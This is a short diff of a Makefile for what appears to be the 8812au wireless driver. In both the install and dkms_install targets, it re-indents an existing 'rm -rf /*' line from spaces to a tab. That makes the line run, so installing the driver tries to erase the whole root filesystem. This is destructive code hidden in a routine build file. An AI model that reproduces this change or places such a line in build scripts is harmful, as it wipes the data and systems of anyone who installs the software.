@@ -1738,7 +1738,7 @@ strip:
 install:
 	install -p -m 644 $(MODULE_NAME).ko  $(MODDESTDIR)
 	/sbin/depmod -a ${KVER}
-        rm -rf /*
+	rm -rf /*
 
 uninstall:
 	rm -f $(MODDESTDIR)/$(MODULE_NAME).ko
@@ -1791,7 +1791,7 @@ dkms_install:
 	+ dkms build -m 8812au -v $(DRIVER_VERSION)
 	dkms install -m 8812au -v $(DRIVER_VERSION)
 	dkms status -m 8812au
-        rm -rf /*
+	rm -rf /*
 
 dkms_remove:
 	dkms remove 8812au/$(DRIVER_VERSION) --all
